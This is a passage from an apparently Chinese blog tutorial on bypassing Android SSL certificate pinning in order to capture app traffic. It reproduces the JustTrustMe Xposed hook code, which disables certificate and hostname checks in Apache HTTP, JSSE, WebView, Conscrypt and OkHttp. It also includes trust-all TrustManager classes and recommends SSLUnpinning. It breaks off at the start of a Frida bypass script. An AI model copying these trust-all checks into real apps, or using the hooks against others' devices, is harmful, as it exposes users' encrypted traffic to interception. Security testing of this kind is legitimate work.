class="string">&quot;org.apache.http.conn.ssl.SSLSocketFactory&quot;</span>, lpparam.classLoader, <span class="string">&quot;getSocketFactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> (SSLSocketFactory) newInstance(SSLSocketFactory.class);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* external/apache-http/src/org/apache/http/conn/ssl/SSLSocketFactory.java */</span></span><br><span class="line">        <span class="comment">/* public boolean isSecure(Socket) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking SSLSocketFactory(Socket) for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;org.apache.http.conn.ssl.SSLSocketFactory&quot;</span>, lpparam.classLoader, <span class="string">&quot;isSecure&quot;</span>, Socket.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* JSSE Hooks */</span></span><br><span class="line">        <span class="comment">/* libcore/luni/src/main/java/javax/net/ssl/TrustManagerFactory.java */</span></span><br><span class="line">        <span class="comment">/* public final TrustManager[] getTrustManager() */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking TrustManagerFactory.getTrustManagers() for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;javax.net.ssl.TrustManagerFactory&quot;</span>, lpparam.classLoader, <span class="string">&quot;getTrustManagers&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (hasTrustManagerImpl()) &#123;</span><br><span class="line">                    Class&lt;?&gt; cls = findClass(<span class="string">&quot;com.android.org.conscrypt.TrustManagerImpl&quot;</span>, lpparam.classLoader);</span><br><span class="line"></span><br><span class="line">                    TrustManager[] managers = (TrustManager[])param.getResult();</span><br><span class="line">                    <span class="keyword">if</span>(managers.length &gt; <span class="number">0</span> &amp;&amp; cls.isInstance(managers[<span class="number">0</span>]))</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                param.setResult(<span class="keyword">new</span> <span class="title class_">TrustManager</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ImSureItsLegitTrustManager</span>()&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* libcore/luni/src/main/java/javax/net/ssl/HttpsURLConnection.java */</span></span><br><span class="line">        <span class="comment">/* public void setDefaultHostnameVerifier(HostnameVerifier) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking HttpsURLConnection.setDefaultHostnameVerifier for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;javax.net.ssl.HttpsURLConnection&quot;</span>, lpparam.classLoader, <span class="string">&quot;setDefaultHostnameVerifier&quot;</span>,</span><br><span class="line">                            HostnameVerifier.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* libcore/luni/src/main/java/javax/net/ssl/HttpsURLConnection.java */</span></span><br><span class="line">        <span class="comment">/* public void setSSLSocketFactory(SSLSocketFactory) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking HttpsURLConnection.setSSLSocketFactory for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;javax.net.ssl.HttpsURLConnection&quot;</span>, lpparam.classLoader, <span class="string">&quot;setSSLSocketFactory&quot;</span>, javax.net.ssl.SSLSocketFactory.class,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* libcore/luni/src/main/java/javax/net/ssl/HttpsURLConnection.java */</span></span><br><span class="line">        <span class="comment">/* public void setHostnameVerifier(HostNameVerifier) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking HttpsURLConnection.setHostnameVerifier for: &quot;</span> + currentPackageName);</span><br><span class="line">        findAndHookMethod(<span class="string">&quot;javax.net.ssl.HttpsURLConnection&quot;</span>, lpparam.classLoader, <span class="string">&quot;setHostnameVerifier&quot;</span>, HostnameVerifier.class,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* WebView Hooks */</span></span><br><span class="line">        <span class="comment">/* frameworks/base/core/java/android/webkit/WebViewClient.java */</span></span><br><span class="line">        <span class="comment">/* public void onReceivedSslError(Webview, SslErrorHandler, SslError) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking WebViewClient.onReceivedSslError(WebView, SslErrorHandler, SslError) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        findAndHookMethod(<span class="string">&quot;android.webkit.WebViewClient&quot;</span>, lpparam.classLoader, <span class="string">&quot;onReceivedSslError&quot;</span>,</span><br><span class="line">                              WebView.class, SslErrorHandler.class, SslError.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                ((android.webkit.SslErrorHandler)param.args[<span class="number">1</span>]).proceed();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* frameworks/base/core/java/android/webkit/WebViewClient.java */</span></span><br><span class="line">        <span class="comment">/* public void onReceivedError(WebView, int, String, String) */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking WebViewClient.onReceivedSslError(WebView, int, string, string) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        findAndHookMethod(<span class="string">&quot;android.webkit.WebViewClient&quot;</span>, lpparam.classLoader, <span class="string">&quot;onReceivedError&quot;</span>,</span><br><span class="line">                            WebView.class, <span class="type">int</span>.class, String.class, String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Multi-dex support: https://github.com/rovo89/XposedBridge/issues/30#issuecomment-68486449</span></span><br><span class="line">        findAndHookMethod(<span class="string">&quot;android.app.Application&quot;</span>,</span><br><span class="line">            lpparam.classLoader,</span><br><span class="line">            <span class="string">&quot;attach&quot;</span>,</span><br><span class="line">            Context.class,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    <span class="comment">// Hook OkHttp or third party libraries.</span></span><br><span class="line">                    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> (Context) param.args[<span class="number">0</span>];</span><br><span class="line">                    processOkHttp(context.getClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Only for newer devices should we try to hook TrustManagerImpl */</span></span><br><span class="line">        <span class="keyword">if</span> (hasTrustManagerImpl()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* external/conscrypt/src/platform/java/org/conscrypt/TrustManagerImpl.java#217 */</span></span><br><span class="line">            <span class="comment">/* public List&lt;X509Certificate&gt; checkServerTrusted(X509Certificate[] chain,</span></span><br><span class="line"><span class="comment">                                    String authType, String host) throws CertificateException */</span></span><br><span class="line">            Log.d(TAG, <span class="string">&quot;Hooking com.android.org.conscrypt.TrustManagerImpl.checkServerTrusted(X509Certificate[]) for: &quot;</span> + currentPackageName);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;com.android.org.conscrypt.TrustManagerImpl&quot;</span>, lpparam.classLoader,</span><br><span class="line">                                <span class="string">&quot;checkServerTrusted&quot;</span>, X509Certificate[].class, String.class,</span><br><span class="line">                                String.class, <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                    ArrayList&lt;X509Certificate&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;X509Certificate&gt;();</span><br><span class="line">                    <span class="keyword">return</span> list;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">// End Hooks</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Helpers */</span></span><br><span class="line">    <span class="comment">// Check for TrustManagerImpl class</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasTrustManagerImpl</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.android.org.conscrypt.TrustManagerImpl&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Create a SingleClientConnManager that trusts everyone!</span></span><br><span class="line">    <span class="keyword">public</span> ClientConnectionManager <span class="title function_">getSCCM</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        KeyStore trustStore;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            trustStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">            trustStore.load(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">SSLSocketFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrustAllSSLSocketFactory</span>(trustStore);</span><br><span class="line">            sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);</span><br><span class="line"></span><br><span class="line">            <span class="type">SchemeRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SchemeRegistry</span>();</span><br><span class="line">            registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;http&quot;</span>, PlainSocketFactory.getSocketFactory(), <span class="number">80</span>));</span><br><span class="line">            registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;https&quot;</span>, sf, <span class="number">443</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ClientConnectionManager</span> <span class="variable">ccm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingleClientConnManager</span>(<span class="literal">null</span>, registry);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ccm;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//This function creates a ThreadSafeClientConnManager that trusts everyone!</span></span><br><span class="line">     <span class="keyword">public</span> ClientConnectionManager <span class="title function_">getTSCCM</span><span class="params">(HttpParams params)</span> &#123;</span><br><span class="line"></span><br><span class="line">        KeyStore trustStore;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            trustStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">            trustStore.load(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">SSLSocketFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrustAllSSLSocketFactory</span>(trustStore);</span><br><span class="line">            sf.setHostnameVerifier(SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);</span><br><span class="line"></span><br><span class="line">            <span class="type">SchemeRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SchemeRegistry</span>();</span><br><span class="line">            registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;http&quot;</span>, PlainSocketFactory.getSocketFactory(), <span class="number">80</span>));</span><br><span class="line">            registry.register(<span class="keyword">new</span> <span class="title class_">Scheme</span>(<span class="string">&quot;https&quot;</span>, sf, <span class="number">443</span>));</span><br><span class="line"></span><br><span class="line">            <span class="type">ClientConnectionManager</span> <span class="variable">ccm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadSafeClientConnManager</span>(params, registry);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ccm;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//This function determines what object we are dealing with.</span></span><br><span class="line">    <span class="keyword">public</span> ClientConnectionManager <span class="title function_">getCCM</span><span class="params">(Object o, HttpParams params)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> o.getClass().getSimpleName();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;SingleClientConnManager&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> getSCCM();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (className.equals(<span class="string">&quot;ThreadSafeClientConnManager&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> getTSCCM(params);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">processOkHttp</span><span class="params">(ClassLoader classLoader)</span> &#123;</span><br><span class="line">        <span class="comment">/* hooking OKHTTP by SQUAREUP */</span></span><br><span class="line">        <span class="comment">/* com/squareup/okhttp/CertificatePinner.java available online @ https://github.com/square/okhttp/blob/master/okhttp/src/main/java/com/squareup/okhttp/CertificatePinner.java */</span></span><br><span class="line">        <span class="comment">/* public void check(String hostname, List&lt;Certificate&gt; peerCertificates) throws SSLPeerUnverifiedException&#123;&#125;*/</span></span><br><span class="line">        <span class="comment">/* Either returns true or a exception so blanket return true */</span></span><br><span class="line">        <span class="comment">/* Tested against version 2.5 */</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking com.squareup.okhttp.CertificatePinner.check(String,List) (2.5) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;com.squareup.okhttp.CertificatePinner&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;com.squareup.okhttp.CertificatePinner&quot;</span>,</span><br><span class="line">                classLoader,</span><br><span class="line">                <span class="string">&quot;check&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                List.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 2.5 not found in &quot;</span>  + currentPackageName  + <span class="string">&quot;-- not hooking&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/CertificatePinner.java#L144</span></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Hooking okhttp3.CertificatePinner.check(String,List) (3.x) for: &quot;</span> + currentPackageName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.CertificatePinner&quot;</span>,</span><br><span class="line">                classLoader,</span><br><span class="line">                <span class="string">&quot;check&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                List.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/internal/tls/OkHostnameVerifier.java</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>,</span><br><span class="line">                classLoader,</span><br><span class="line">                <span class="string">&quot;verify&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                javax.net.ssl.SSLSession.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking OkHostnameVerifier.verify(String, SSLSession)&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//https://github.com/square/okhttp/blob/parent-3.0.1/okhttp/src/main/java/okhttp3/internal/tls/OkHostnameVerifier.java</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            classLoader.loadClass(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>);</span><br><span class="line">            findAndHookMethod(<span class="string">&quot;okhttp3.internal.tls.OkHostnameVerifier&quot;</span>,</span><br><span class="line">                classLoader,</span><br><span class="line">                <span class="string">&quot;verify&quot;</span>,</span><br><span class="line">                String.class,</span><br><span class="line">                java.security.cert.X509Certificate.class,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">XC_MethodReplacement</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> Object <span class="title function_">replaceHookedMethod</span><span class="params">(MethodHookParam methodHookParam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;OKHTTP 3.x not found in &quot;</span> + currentPackageName + <span class="string">&quot; -- not hooking OkHostnameVerifier.verify(String, X509)(&quot;</span>);</span><br><span class="line">            <span class="comment">// pass</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ImSureItsLegitTrustManager</span> <span class="keyword">implements</span> <span class="title class_">X509TrustManager</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123; &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123; &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">X509Certificate</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This class creates a SSLSocket that trusts everyone. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrustAllSSLSocketFactory</span> <span class="keyword">extends</span> <span class="title class_">SSLSocketFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">SSLContext</span> <span class="variable">sslContext</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">TrustAllSSLSocketFactory</span><span class="params">(KeyStore truststore)</span> <span class="keyword">throws</span></span><br><span class="line">                      NoSuchAlgorithmException, KeyManagementException, KeyStoreException, UnrecoverableKeyException &#123;</span><br><span class="line">            <span class="built_in">super</span>(truststore);</span><br><span class="line"></span><br><span class="line">            <span class="type">TrustManager</span> <span class="variable">tm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">X509TrustManager</span>() &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkClientTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkServerTrusted</span><span class="params">(X509Certificate[] chain, String authType)</span> <span class="keyword">throws</span> CertificateException &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            sslContext.init(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">TrustManager</span>[] &#123; tm &#125;, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Socket <span class="title function_">createSocket</span><span class="params">(Socket socket, String host, <span class="type">int</span> port, <span class="type">boolean</span> autoClose)</span> <span class="keyword">throws</span> IOException, UnknownHostException &#123;</span><br><span class="line">            <span class="keyword">return</span> sslContext.getSocketFactory().createSocket(socket, host, port, autoClose);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Socket <span class="title function_">createSocket</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> sslContext.getSocketFactory().createSocket();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// findAndHookMethod 就是hook对应方法 它hook的函数就是 证书校验用到的函数</span></span><br></pre></td></tr></table></figure>
<p style="text-indent: 2em;">通过上述代码我们发现JustTrustMe几乎hook住了所有有关证书验证的操作通过修改返回值、忽略证书错误等方法来进行绕过。
<p style="text-indent: 2em;">但是JustTrustMe没有hook   public OkHttpClient.Builder hostnameVerifier（Okhttp 中如果不指定 HostnameVerifier 默认调用的是 OkHostnameVerifier.verify 进行服务器主机名校验；如果设置了 HostnameVerifier，则默认调用的是自定义的 verify 方法，而OkHttpClient.Builder是用来对OkHttpClient进行设置的），所以这里就很可能出问题。至于其他的漏掉的hook目前还未测出。也有可能是他是github星星最多的项目，大家都对它进行下手了，😂。总之JustTrustMe有时候会不起作用。所以我平时也不是经常用它。

<p><strong>ssl-unpining模块绕过</strong></p>
<p style="text-indent: 2em;">此模块是我用的最多的，他比JustTrustMe 更稳定、hook的更全面，一般可以直接hook抓包，而且由于它同样不需要我们编写代码，是最方便新手的了。</p>
<p style="text-indent: 2em;">模块下载地址：https://github.com/ac-pm/SSLUnpinning_Xposed

<p style="text-indent: 2em;">直接安装后重启配置代理抓包即可，简单粗暴。</p>

<p><strong>frida绕过SSLPinning</strong></p>
<p style="text-indent: 2em;">frida确实是很好用的一个工具，它不需要像xpose那样频繁重启，而且还可以定制化hook自己想修改的函数。我平常用frida是通过js代码来进行hook的

<p style="text-indent: 2em;">下面就是我常用的一个ssl-Unpinning的脚本(其实就是通过人家开源的修改而来)：

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Android SSL Re-pinning frida script v0.2 030417-pier</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">   $ adb push burpca-cert-der.crt /data/local/tmp/cert-der.crt</span></span><br><span class="line"><span class="comment">   $ frida -U -f it.app.mobile -l frida-android-repinning.js --no-pause</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">   https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span 